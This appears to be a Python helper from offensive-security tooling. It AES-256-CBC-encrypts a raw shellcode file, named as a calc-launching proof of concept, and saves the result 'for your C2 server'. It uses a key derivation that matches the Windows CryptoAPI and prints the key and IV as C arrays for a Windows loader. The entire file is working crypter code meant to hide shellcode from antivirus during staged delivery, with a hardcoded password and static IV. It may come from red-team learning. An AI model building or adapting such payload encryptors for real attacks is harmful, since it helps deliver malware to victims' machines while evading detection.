import os
import hashlib
# Ensure you have pycryptodome installed via: pip install pycryptodome
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def encrypt_payload(input_filename, output_filename, raw_key, iv_bytes):
    # 1. Read the raw shellcode bytes
    if not os.path.exists(input_filename):
        print(f"[-] Error: {input_filename} not found.")
        return
        
    with open(input_filename, "rb") as f:
        shellcode = f.read()
    
    print(f"[*] Original Shellcode Size: {len(shellcode)} bytes")

    # 2. Derive the AES-256 key matching Windows CryptDeriveKey (SHA-256 hash of the passkey)
    aes_key = hashlib.sha256(raw_key).digest()

    # 3. Apply PKCS#7 padding (Windows CryptoAPI defaults to PKCS#7 / padded blocks)
    padded_shellcode = pad(shellcode, AES.block_size, style='pkcs7')

    # 4. Encrypt using AES-CBC
    cipher = AES.new(aes_key, AES.MODE_CBC, iv=iv_bytes)
    encrypted_data = cipher.encrypt(padded_shellcode)

    # 5. Save the encrypted raw binary stream for your C2 server
    with open(output_filename, "wb") as f:
        f.write(encrypted_data)
        
    print(f"[+] Encrypted payload successfully saved to: {output_filename}")
    print(f"[*] Encrypted File Size: {len(encrypted_data)} bytes\n")

    # 6. output
    print("// ========================================================")
    print("// KEYS ARE NOW READY!!!!!!!!!!!!!:")
    print("// ========================================================")
    
    c_iv = ", ".join(f"0x{b:02x}" for b in iv_bytes)
    print(f"unsigned char iv[] = {{ {c_iv} }};")
    
    c_key = ", ".join(f"0x{b:02x}" for b in raw_key)
    print(f"unsigned char key[] = {{ {c_key} }};")
    print("// ========================================================\n")


if __name__ == "__main__":
    INPUT_FILE = "runcalcshellcode.bin"
    OUTPUT_FILE = "runcalcshellcode.enc" 
    
    MY_PASSWORD = b"password!" 
    MY_IV = b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"

    encrypt_payload(INPUT_FILE, OUTPUT_FILE, MY_PASSWORD, MY_IV)
